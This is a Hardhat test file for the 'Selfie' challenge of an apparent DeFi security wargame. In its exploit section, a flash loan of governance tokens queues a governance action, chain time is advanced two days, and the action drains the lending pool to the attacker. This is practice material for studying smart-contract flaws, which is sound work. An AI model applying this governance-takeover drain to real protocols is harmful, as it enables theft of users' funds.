const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Selfie', function () {
    let deployer, attacker;

    const TOKEN_INITIAL_SUPPLY = ethers.utils.parseEther('2000000'); // 2 million tokens
    const TOKENS_IN_POOL = ethers.utils.parseEther('1500000'); // 1.5 million tokens
    
    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();
        
        const DamnValuableTokenSnapshotFactory = await ethers.getContractFactory('DamnValuableTokenSnapshot', deployer);
        const SimpleGovernanceFactory = await ethers.getContractFactory('SimpleGovernance', deployer);
        const SelfiePoolFactory = await ethers.getContractFactory('SelfiePool', deployer);

        console.log("deloy DamnValuableTokenSnapshot......");
        console.log("deloy SimpleGovernance......");
        console.log("deloy SelfiePool......");

        this.token = await DamnValuableTokenSnapshotFactory.deploy(TOKEN_INITIAL_SUPPLY);
        this.governance = await SimpleGovernanceFactory.deploy(this.token.address);
        this.pool = await SelfiePoolFactory.deploy(
            this.token.address,
            this.governance.address    
        );
        
        console.log();
        console.log("DamnValuableTokenSnapshot been deployed!");
        console.log("SimpleGovernance been deployed!");
        console.log("SelfiePool been deployed!");
        
        console.log();
        console.log("DamnValuableTokenSnapshot address : ",this.token.address);
        console.log("SimpleGovernance address : ",this.governance.address);
        console.log("SelfiePool address : ",this.pool.address);
        console.log("attacker address : ",attacker.address);

        console.log();
        console.log("mint 1.5 million to pool......");
        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);
        
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.equal(TOKENS_IN_POOL);
        
        const attackerBalanceBefore = await this.token.balanceOf(attacker.address);
        console.log();
        console.log("attackerBalanceBefore's balanceAfter : ",attackerBalanceBefore.toString());

        const poolBalanceBefore = await this.token.balanceOf(this.pool.address);
        console.log("SelfiePool's balanceBefore : ",poolBalanceBefore.toString());
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        const ExploitFactory = await ethers.getContractFactory('SelfieExploit', attacker);
        const exploit = await ExploitFactory.deploy(this.governance.address, this.pool.address);
     
        // 1. Flash loan enough governance tokens to queue drain action.
        await exploit.takeoverGov(TOKENS_IN_POOL);
     
        // Simulate waiting for the action delay to pass.
        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days
     
        // 2. After waiting for the action delay to have passed, execute it.
        await exploit.drainToAttacker();

    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        const attackerBalance = await this.token.balanceOf(attacker.address);
        console.log();
        console.log("attackerBalance's balanceAfter : ",attackerBalance.toString());
        
        const poolBalanceAfter = await this.token.balanceOf(this.pool.address);
        console.log("SelfiePool's balanceAfter : ",poolBalanceAfter.toString());
        
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.be.equal(TOKENS_IN_POOL);        
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.equal('0');
    });
});